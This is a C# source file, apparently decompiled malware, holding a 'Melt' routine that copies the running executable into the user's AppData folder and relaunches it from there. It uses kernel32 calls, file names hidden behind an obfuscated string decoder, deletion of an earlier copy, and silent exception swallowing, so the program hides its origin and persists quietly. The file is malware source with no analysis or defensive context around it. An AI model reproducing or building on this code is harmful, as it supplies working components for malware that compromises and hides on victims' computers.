using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DAMelt
{
	public class Meltdll
	{
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetModuleFileNameA(int HMDLE, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int ExitProcess(uint uExitCode);

		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

		public static void Melt()
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LOOTCKC.IPNPIWT("foqxsrORsLe1tX6Usb2WkqGpw6aUa63HpiQ=", "False")))
				{
					File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LOOTCKC.IPNPIWT("fYmwsbKQr7a0tH2TsLyVkaCowqWTaqzGpSU=", "False"));
				}
				string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
				string lpFileName = Process.GetCurrentProcess().MainModule!.FileName;
				MoveFileExW(Strings.Left(fileName, GetModuleFileNameA(0, ref lpFileName, 256)), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LOOTCKC.IPNPIWT("oKzT1NWz0tnX16C209+4tMPL5ci2jc/pyAI=", "False"), 8L);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + LOOTCKC.IPNPIWT("c3+mp6iGpayqqnOJprKLh5aeuJuJYKK8my8=", "False"));
				ExitProcess(0u);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
